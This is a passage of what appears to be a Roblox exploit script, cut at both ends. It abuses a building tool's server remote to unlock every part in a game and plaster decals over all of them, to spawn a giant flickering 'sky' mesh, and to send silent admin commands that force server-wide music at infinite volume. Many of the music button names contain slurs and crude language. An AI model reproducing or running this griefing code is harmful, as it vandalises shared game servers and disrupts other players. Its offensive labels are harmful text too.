			}

		}

	}

	_(args)

end

function CreateSpotlight(part)

	local args = {

		"CreateLights",

		{

			{

				Part = part,

				LightType = "SpotLight"

			}

		}

	}

	_(args)

end

function SyncLighting(part, brightness)

	local args = {

		"SyncLighting",

		{

			{

				Part = part,

				LightType = "SpotLight",

				Brightness = brightness

			}

		}

	}

	_(args)

end

function Color(part, color)

	local args = {

		"SyncColor",

		{

			{

				Part = part,

				Color = color,

				UnionColoring = false

			}

		}

	}

	_(args)

end

function SpawnDecal(part, side)

	local args = {

		"CreateTextures",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal"

			}

		}

	}

	_(args)

end

function AddDecal(part, asset, side)

	local args = {

		"SyncTexture",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal",

				Texture = "rbxassetid://" .. asset

			}

		}

	}

	_(args)

end

function spam(id)

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") then

			spawn(function()

				SetLocked(v, false)

				for _, side in ipairs(Enum.NormalId:GetEnumItems()) do

					SpawnDecal(v, side)

					AddDecal(v, id, side)

				end

			end)

		end

	end

end

spam("102045708453546")
end
})
AddButton({
    Name = "SpinningChip Sky",
    Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
SilentRequest:InvokeServer(";music 70635213877495")
SilentRequest:InvokeServer(";pitch 0.1625")
SilentRequest:InvokeServer(";volume inf")
wait(1.5)
SilentRequest:InvokeServer(";fogcolor black ;time 0")

local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

for i, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for i, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint
local RunService = game:GetService("RunService")

function _(args)
    remote:InvokeServer(unpack(args))
end

function CreatePart(cf, parent)
    local args = {
        [1] = "CreatePart",
        [2] = "Normal",
        [3] = cf,
        [4] = parent
    }
    _(args)
end

function SetAnchor(part, boolean)
    local args = {
        [1] = "SyncAnchor",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Anchored"] = boolean
            }
        }
    }
    _(args)
end

function AddMesh(part)
    local args = {
        [1] = "CreateMeshes",
        [2] = {
            [1] = {
                ["Part"] = part
            }
        }
    }
    _(args)
end

function SetMesh(part, meshid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["MeshId"] = "rbxassetid://" .. meshid
            }
        }
    }
    _(args)
end

function SetTexture(part, texid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["TextureId"] = texid
            }
        }
    }
    _(args)
end

function MeshResize(part, size)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Scale"] = size
            }
        }
    }
    _(args)
end

function SetTransparency(part, value)
    local args = {
        [1] = "SyncTransparency",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Transparency"] = value
            }
        }
    }
    _(args)
end

function DestroyPart(part)
    local args = {
        [1] = "Remove",
        [2] = {
            [1] = part
        }
    }
    _(args)
end

local images = {
    "http://www.roblox.com/asset/?id=92815472048859",
    "http://www.roblox.com/asset/?id=70550203344088",
    "http://www.roblox.com/asset/?id=106235416208776",
    "http://www.roblox.com/asset/?id=110559328229354",
}

local skyPart
local skyLoop
local frameTime = 1 / 10
local lastUpdate = 0

function CreateSky()
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    local cf = hrp.CFrame
    CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)

    local found = false
    for i = 1, 50 do
        task.wait()
        for _, v in workspace:GetDescendants() do
            if v:IsA("BasePart") and (v.Position - (cf.Position + Vector3.new(0, 6, 0))).Magnitude < 1 then
                skyPart = v
                found = true
                break
            end
        end
        if found then break end
    end

    if not skyPart then return end

    SetAnchor(skyPart, true)
    AddMesh(skyPart)
    SetMesh(skyPart, "111891702759441")
    MeshResize(skyPart, Vector3.new(90000, 90000, 90000)) -- skybox size updated here
    SetTransparency(skyPart, 0)

    local index = 1
    skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
        lastUpdate = lastUpdate + deltaTime
        if lastUpdate >= frameTime then
            lastUpdate = 0
            if not skyPart then
                skyLoop:Disconnect()
                return
            end
            SetTexture(skyPart, images[index])
            index = (index % #images) + 1
        end
    end)
end

function ResetSky()
    if skyLoop then
        skyLoop:Disconnect()
        skyLoop = nil
    end
    if skyPart then
        DestroyPart(skyPart)
        skyPart = nil
    end
    task.spawn(CreateSky)
end

player.CharacterAdded:Connect(function(newChar)
    char = newChar
    ResetSky()
end)

if char and char:FindFirstChild("Humanoid") then
    char:WaitForChild("Humanoid").Died:Connect(function()
        ResetSky()
    end)
end

CreateSky()
end
})

MusicAddButton({
    Name = "Trench Boy",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 110861497122845")
SilentRequest:InvokeServer(";pitch .1")
SilentRequest:InvokeServer(";volume inf")
    end
})

MusicAddButton({
    Name = "Gangsta Paradise",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 131407305554232")
SilentRequest:InvokeServer(";pitch 0.11")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Robbery",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 116887362714207")
SilentRequest:InvokeServer(";pitch 0.167")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Gangsta style",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 136300748366142")
SilentRequest:InvokeServer(";pitch 0.11")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = " Racist Song",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 74480486373722")
SilentRequest:InvokeServer(";pitch 0.156")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "679",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 72420924397376")
SilentRequest:InvokeServer(";pitch 0.2")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Dicks in my butt",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 79135236836095")
SilentRequest:InvokeServer(";pitch 0.097")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Don't work Anymore",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 73508691589033")
SilentRequest:InvokeServer(";pitch 0.2")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Dont work Anymore",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 112120080486264")
SilentRequest:InvokeServer(";pitch 0.150")
SilentRequest:InvokeServer(";volume inf")
    end
})

MusicAddButton({
    Name = "Revenge",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 113238741822041")
SilentRequest:InvokeServer(";pitch 0.142")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Xo Tour Life",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 75954440425231")
SilentRequest:InvokeServer(";pitch 0.142")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Changes",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 103315293083837")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Tay K",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 102237185155700")
SilentRequest:InvokeServer(";pitch 0.142")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Wii Shop Theme",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 109425200074024")
SilentRequest:InvokeServer(";pitch 0.154")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Twist Jump",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 122263136565419")
SilentRequest:InvokeServer(";pitch 0.210")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Spooky Remix",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 110587373430189")
SilentRequest:InvokeServer(";pitch 0.124")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Electro sp00k",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 85481339656782")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Electro sp00k speed up",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 85481339656782")
SilentRequest:InvokeServer(";pitch 0.2")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Spooky Remix x2",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 110587373430189")
SilentRequest:InvokeServer(";pitch 0.177")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Pressure",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 135886229129696")
SilentRequest:InvokeServer(";pitch 0.143")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Orange Soda",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 95669340281523")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "GTA 4 Music",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 80403544262483")
SilentRequest:InvokeServer(";pitch 0.25")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Blood Pop",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 133251269532695")
SilentRequest:InvokeServer(";pitch 0.143")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Ohio Loop",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 100891040749418")
SilentRequest:InvokeServer(";pitch 0.25")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Some Loop",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 107482942350312")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Krab Better Off Alone",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 83197094750741")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "WifiSkeleton",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 80536187524910")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Space Jam",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 103650979497454")
SilentRequest:InvokeServer(";pitch 0.125")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "YEAH!",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 73562744560566")
SilentRequest:InvokeServer(";pitch 0.125")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Sugar Crash",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 107020752830019")
SilentRequest:InvokeServer(";pitch 0.155")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Don't like",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 130585576222032")
SilentRequest:InvokeServer(";pitch 0.125")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Sad nga hours",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 77813514369746")
SilentRequest:InvokeServer(";pitch 0.125")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Look At me",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 123031772532465")
SilentRequest:InvokeServer(";pitch 0.125")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Genocide pt4",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 114227367423167")
SilentRequest:InvokeServer(";pitch 0.125")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Met Her",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 118252483474508")
SilentRequest:InvokeServer(";pitch 0.125")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Don't work Anymore",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 90226759717646")
SilentRequest:InvokeServer(";pitch 0.2")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "2014 Mario.exe",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 108426430685406")
SilentRequest:InvokeServer(";pitch 0.25")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Lavender Town",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 85789014973504")
SilentRequest:InvokeServer(";pitch 0.12")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Ngas on paris",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 80217751036107")
SilentRequest:InvokeServer(";pitch 0.143")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Unit load",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 110781715902838")
SilentRequest:InvokeServer(";pitch 0.2")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "This Feeling",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 70924607021920")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Bitch Wtf Nga",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 127665886963153")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Doesn't work",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 71713528574891")
SilentRequest:InvokeServer(";pitch 0.25")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Phonk Loop",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 5356466111")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "XXXTENTACION",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 86520746630397")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
    end
})

MusicAddButton({
    Name = "Juice Wrld",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 109914086168461")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
    end
})

MusicAddButton({
    Name = "Crunch Time",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 100253052171063")
SilentRequest:InvokeServer(";pitch 0.106")
SilentRequest:InvokeServer(";volume inf")
    end
})

MusicAddButton({
    Name = "Saw U At Party",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 134067130228571")
SilentRequest:InvokeServer(";pitch 0.133")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Spooky Skeleton",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 136247552074672")
SilentRequest:InvokeServer(";pitch 0.125")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Corrido",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 75114960938580")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Spongebob song",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 73002098096282")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Mi Casa",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 123802828776197")
SilentRequest:InvokeServer(";pitch 0.128")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Trap",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 96187142079390")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Again",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 81175200591199")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Sesame Street",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 92512466676196")
SilentRequest:InvokeServer(";pitch 0.125")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "electro spook",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 71956674693421")
SilentRequest:InvokeServer(";pitch 1.7")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "Rebzyyx",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 126202579497643")
SilentRequest:InvokeServer(";pitch 0.123")
SilentRequest:InvokeServer(";volume inf")
    end
})
MusicAddButton({
    Name = "SunBurst",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 121336636707861")
end
})
MusicAddButton({
    Name = "Return Of The Tres",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 109008039044385")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Moan",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 126738363909118")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "90MH",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 93749495002488")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "XANAX",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 82013515789569")
SilentRequest:InvokeServer(";pitch 0.2")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Boom may/not work",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 81002566579651")
SilentRequest:InvokeServer(";pitch .165")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Phonk",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 92864828514905")
SilentRequest:InvokeServer(";pitch .25")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Subway Sexists",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 137418375092271")
SilentRequest:InvokeServer(";pitch .11")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Is Ya Ready",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 97452120217197")
SilentRequest:InvokeServer(";pitch .12")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Brace Yourself",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 131397206526762")
SilentRequest:InvokeServer(";pitch .195")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Phonk 2",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 99203686468113")
SilentRequest:InvokeServer(";pitch .31")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Eva",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 97957383071356")
